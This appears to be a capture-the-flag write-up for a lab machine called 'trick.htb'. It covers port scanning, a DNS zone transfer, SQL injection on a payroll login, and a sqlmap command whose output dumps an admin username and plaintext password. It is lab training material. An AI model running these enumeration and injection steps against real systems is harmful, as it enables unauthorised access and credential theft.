# Nmap 
---
```
22 - OpenSSH 7.9p1 Debian 10+deb10u2
25 - Postfix
53 - BIND "9.11.5-P4-5.1+deb10u7-Debian"
80 - nginx 1.14.2 - unconfigured boostrap
```
---

## DNS Enum
---
```
nslookup
> SERVER 10.10.11.166
Default server: 10.10.11.166
Address: 10.10.11.166#53
> 10.10.11.166
166.11.10.10.in-addr.arpa       name = trick.htb.
>
```
```
dig axfr @10.10.11.166 trick.htb

; <<>> DiG 9.18.1-1-Debian <<>> axfr @10.10.11.166 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 32 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
 WHEN: Mon Jul 04 23:11:04 IST 2022
;; XFR size: 6 records (messages 1, bytes 231)
```
---

## SQLi
---
<a href="http://preprod-payroll.trick.htb" target="_blank">http://preprod-payroll.trick.htb</a><br/>
  
The preprod portal has a login page, which is vulnerable to SQli  
  
![sqli](./sqli.png)

We now have access to the payroll portal, it might be worth testing the site for more SQLi vulns  
After trying sqlmap on various forms, the 'save deduction' form seems to be vulnerable  
  
![deductions](./deductions.png)

```
sqlmap -r save_deductions.req --batch --threads 10 -D payroll_db -T users --dump
```
```
tabase: payroll_db
Table: users
[1 entry]
+----+-----------+----------------+------+---------+---------+-----------------------+------------+
| id | doctor_id | name           | type | address | contact | password              | username   |
---+-----------+----------------+------+---------+---------+-----------------------+------------+
| 1  | 0         | Administrateur | 1    | <blank> | <blank> | SuperGucciRainbowCake | Enemigosss |
+----+-----------+----------------+------+---------+---------+-----------------------+------------+
```
---
